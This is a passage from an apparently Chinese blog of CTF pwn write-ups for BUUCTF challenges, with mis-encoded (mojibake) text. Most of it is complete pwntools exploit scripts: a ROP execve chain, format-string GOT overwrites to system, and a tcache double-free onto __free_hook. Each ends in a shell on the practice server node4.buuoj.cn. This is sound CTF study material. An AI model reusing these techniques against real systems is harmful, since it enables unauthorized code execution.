class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080549db</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de955</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806f02a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049303</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806cc25</span>) <span class="hljs-comment"># int 0x80</span><br>        <span class="hljs-keyword">return</span> p<br>payload=pd()<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-easy-equation">mrctf2020_easy_equation</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29673</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x4006D0</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wdb-2018-2nd-easyfmt">wdb_2018_2nd_easyfmt</h3><p>å‚è€ƒå¸ˆå‚…ï¼š<a href="https://blog.csdn.net/qq_43935969/article/details/116140885">wdb_2018_2nd_easyfmtè¯¦è§£_åƒåˆé›ªä¸€æ ·è‡ªç”±æ´’è½-CSDNåšå®¢</a></p><p>**pwntoolså·¥å…·ä½¿ç”¨ï¼šfmtstr_payload(offset,{printf_got:system})**æŠŠgotè¡¨æ”¹ä¸ºsystem</p><p>å‘ƒå‘ƒå‘ƒï¼Œå¥½åƒåªèƒ½ç”¨åœ¨32ä½</p><p><strong>å…·ä½“æ­¥éª¤ï¼š</strong></p><p>1.åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²printf_got,å¾—çŸ¥libc_base,</p><p>2.åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æŠŠprintf_gotæ”¹ä¸ºsystem</p><p>3.é€å…¥/bin/sh\x00</p><p>**æ³¨æ„ç‚¹ï¼š**32ä¸ºæ¥æ”¶æ³„éœ²addr=u32(r.recvuntil(â€˜\xf7â€™)[-4:])</p><p>**ç–‘æƒ‘ï¼š**ç»æ ¼å¼å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å‡ºæ¥çš„printf_addr=elf.got[â€˜printfâ€™]å’Œç›´æ¥printf_got=elf.got[â€˜printfâ€™]ä¸æ˜¯åŒä¸€ä¸ªåœ°å€</p><p>ä¸ºå•¥ï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./wdb_2018_2nd_easyfmt&#x27;)</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28021</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./wdb_2018_2nd_easyfmt&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;Do you know repeater?&#x27;</span>)<br>r.sendline(p32(elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>])+<span class="hljs-string">&#x27;%6$s&#x27;</span>)<br>printf_addr=u32(r.recvuntil(<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(printf_addr)<br>base=printf_addr-libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(printf_got)<br>payload = fmtstr_payload(<span class="hljs-number">6</span>,&#123;printf_got:system&#125;)<br>r.sendline(payload)<br>r.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-es-1">ciscn_2019_es_1</h3><p>å‚è€ƒå¸ˆå‚…ï¼š[<a href="https://blog.csdn.net/mcmuyanga/article/details/118193874?ops_request_misc=%7B%22request%5Fid%22%3A%22163555827616780366547653%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163555827616780366547653&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-118193874.pc_search_ecpm_flag&amp;utm_term=ciscn_2019_es_1&amp;spm=1018.2226.3001.4187">BUUCTF]PWNâ€”â€”ciscn_2019_es_1_mcmuyangaçš„åšå®¢-CSDNåšå®¢</a></p><p>æœ¬é¢˜æœ‰uafæ¼æ´</p><p><strong>å…·ä½“æ­¥éª¤ï¼š</strong></p><p>1.åˆ†é…small_binå¤§å°çš„chunkï¼Œå¤§äº0x400å³å¯ï¼Œç»•è¿‡tcacheï¼Œé‡Šæ”¾åå°±ä¼šæ”¾åˆ°unsortbinä¸­ï¼Œåˆ©ç”¨uafï¼Œæ³„éœ²main_arena-96çš„åœ°å€ï¼Œ</p><p>ç”±äºmalloc_hookåœ¨main_arena-0x10å¤„,æ‰€ä»¥ä¹Ÿèƒ½æ³„éœ²libc_base=main_arena-0x10-libc.sym[â€˜__malloc_hookâ€™]</p><p>2.åˆ©ç”¨doublefreeï¼Œè¾¾æˆä»»æ„ä½ç½®å†™å…¥ä»»æ„å€¼çš„ç›®çš„ï¼Œè¿™é‡Œæˆ‘ä»¬å¾€free_hookå†™å…¥system</p><p>(è¿™é¢˜ä¸å¥½æ”¹malloc_hookï¼Œå› ä¸ºä¿®æ”¹åï¼Œç¨‹åºæ‰§è¡Œä¸‹ä¸€æ¬¡ä¼šç”³è¯·ä¸€ä¸ª0x18å¤§å°chunkï¼Œè€Œæˆ‘ä»¬ä¸å¥½æ§åˆ¶ä¸ºâ€™/bin/sh\x00â€™)</p><p>3.é‡Šæ”¾å­˜æœ‰/bin/sh\x00çš„æŸä¸ªå †ï¼Œå¼€shell</p><p><strong>ps:</strong></p><p>20å¹´10æœˆåï¼Œ2.27libcåŠ äº†double freeæ£€æµ‹ã€‚æ‰€ä»¥è¦åšè¿™é“é¢˜æœ¬åœ°è°ƒè¯•çš„æ—¶å€™è¿˜å¾—è¦ä½¿ç”¨<code>patchelf</code>æ¥æ›´æ”¹ä¸€ä¸‹ä½¿ç”¨çš„åŠ¨æ€åº“.</p><p>æ„Ÿè°¢ä¸‹carol7så¸ˆå‚…å¸®æˆ‘æäº†ä¸ªæ”¹åŠ¨æ€åº“é“¾æ¥çš„ä¸€ä¸ªè„šæœ¬ï¼Œä¸è¿‡è²Œä¼¼æ”¹äº†åº“é“¾æ¥åè¿˜æ˜¯è°ƒè¯•ä¸äº†</p><p><strong>æœ€åçš„doublefreeè‡ªå·±çš„ä¸»è§‚è§£é‡Š</strong>ï¼Œæ²¡æ³•è°ƒè¯•çœ‹åˆ°ï¼š</p><p>é‡Šæ”¾ä¸¤æ¬¡æ—¶tcacheçš„biné“¾ï¼šfree1_addr-&gt;free1_addr</p><p>ç¬¬ä¸€æ¬¡ç”³è¯·æ—¶çš„biné“¾:free1_addr-&gt;free_hook_addr</p><p>ç¬¬äºŒæ¬¡ç”³è¯·æ—¶çš„biné“¾ï¼šfree_hook_addr</p><p>åé¢å°±ç”³è¯·åˆ°free_hook_addrä¸­å†™å…¥system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./ciscn_2019_es_1&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28127</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,name,phone</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;name\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;please input name:\n&#x27;</span>,name)<br>    sa(<span class="hljs-string">&#x27;please input compary call:\n&#x27;</span>,phone)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input the index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input the index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><span class="hljs-comment">#----------------------------------------------</span><br>add(<span class="hljs-number">0x410</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&#x27;name:\n&#x27;</span>)<br>main_arena=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-<span class="hljs-number">96</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc_base=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(main_arena)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br><span class="hljs-comment">#--------------------------------------------</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x20</span>,p64(free_hook),<span class="hljs-string">&#x27;1&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,p64(system),<span class="hljs-string">&#x27;3&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-fmt64">axb_2019_fmt64</h3><p>è¿™é¢˜å†™çš„ç¥å¿—ä¸æ¸…äº†å±äºæ˜¯ã€‚è¿˜æœ‰å¥½å¤šç–‘æƒ‘</p><p>å‚è€ƒå¸ˆå‚…ï¼š[<a href="https://blog.csdn.net/mcmuyanga/article/details/113242453?ops_request_misc=%7B%22request%5Fid%22%3A%22163556754916780366559453%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163556754916780366559453&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-113242453.pc_search_ecpm_flag&amp;utm_term=axb_2019_fmt64&amp;spm=1018.2226.3001.4187">BUUCTF]PWNâ€”â€”axb_2019_fmt64ï¼ˆ64ä½æ ¼å¼åŒ–å­—ç¬¦ä¸²æ”¹gotè¡¨ï¼‰_mcmuyangaçš„åšå®¢-CSDNåšå®¢</a></p><p><strong>å…·ä½“æ­¥éª¤ï¼š</strong></p><p>1.æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²libc_base</p><p>2.æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ”¹å†™gotè¡¨ä¸ºsystem</p><p>3.é€å…¥/bin/sh</p><p><strong>64ä½æ”¹å†™gotè¡¨ï¼š</strong></p><p>1.high_sys=(system&gt;&gt;16)&amp;0xff<br>low_sys=system&amp;0xffff</p><p>åˆ†åˆ«å–å€’æ•°ç¬¬ä¸‰ä¸ªå­—èŠ‚ï¼Œå’Œæœ€å2ä¸ªå­—èŠ‚</p><p>2.payload=â€˜%â€™+str(high_sys-9)+â€˜c%12$hhnâ€™+â€˜%â€™+str(low_sys-high_sys)+â€˜c%13$hnâ€™<br>print len(payload)<br>payload = payload.ljust(32,â€œAâ€) + p64(elf.got[â€œstrlenâ€] + 2) + p64(elf.got[â€œstrlenâ€])</p><p>sa(â€˜Please tell me:â€™,payload)</p><p>åˆ†å­—èŠ‚ä¿®æ”¹strlençš„gotè¡¨ä¸ºsystemï¼ˆhhnæ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œhnæ˜¯ä¸¤ä¸ªå­—èŠ‚ï¼‰</p><p><a href="http://3.sa">3.sa</a>(â€˜Please tell me:â€™,â€˜;bin/sh\x00â€™)</p><p>é€/bin/sh\x00</p><p>å› ä¸ºé˜²æ­¢æ ¼å¼åŒ–å­—ç¬¦ä¸²è¢«00æˆªæ–­ï¼Œæ‰€ä»¥æ ¼å¼åŒ–å­—ç¬¦ä¸²è¦æ”¾åœ¨gotå‰é¢</p><p><strong>ç–‘æƒ‘</strong>ï¼šorz</p><p>ä¸ºå•¥binshå‰è¦åŠ ï¼›</p><p>ä¸ºå•¥æ”¹strlençš„gotèƒ½ç”¨ï¼Œæˆ‘æ”¹printfï¼Œsprintfä¸è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./axb_2019_fmt64&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26407</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><br><span class="hljs-comment">#----------------------------------------------</span><br>offest=<span class="hljs-number">8</span><br>sla(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>,<span class="hljs-string">&#x27;%9$spppp&#x27;</span>+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>puts_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts_addr)<br>libc_base=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(system)<br><span class="hljs-comment">#---------------------------------------------</span><br>high_sys=(system&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>low_sys=system&amp;<span class="hljs-number">0xffff</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(high_sys)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(low_sys)<br>payload=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(high_sys-<span class="hljs-number">9</span>)+<span class="hljs-string">&#x27;c%12$hhn&#x27;</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(low_sys-high_sys)+<span class="hljs-string">&#x27;c%13$hn&#x27;</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(payload)<br>payload = payload.ljust(<span class="hljs-number">32</span>,<span class="hljs-string">&quot;A&quot;</span>) + p64(elf.got[<span class="hljs-string">&quot;strlen&quot;</span>] + <span class="hljs-number">2</span>) + p64(elf.got[<span class="hljs-string">&quot;strlen&quot;</span>])<br>sa(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>,payload)<br>sa(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>,<span class="hljs-string">&#x27;;bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="gyctf-2020-some-thing-exceting">gyctf_2020_some_thing_exceting</h3><p>è¿™é¢˜å­˜åœ¨uafæ¼æ´</p><p>ç¨‹åºå¼€å§‹æ—¶è¯»å…¥flagå­˜åœ¨bssæ®µçš„å˜é‡så¤„ï¼Œä¸”å®ƒçš„ä¸Šé¢ç»™äº†æˆ‘ä»¬0x60å¤§å°</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨doublefree åˆ†é…0x60å¤§å°çš„chunkåˆ°æ­¤å¤„ï¼Œç„¶åshow</p><p><strong>ç–‘è™‘</strong>ï¼šä¸ºå•¥ç°åœ¨ä¸­é—´è¦éš”ä¸€ä¸ªfreeï¼Œæˆ‘è®°å¾—ä»¥å‰åšå…¶ä»–é¢˜ç›´æ¥è¿ç»­freeä¹Ÿè¡Œ</p><figure class="highlight python"><table><tr><td 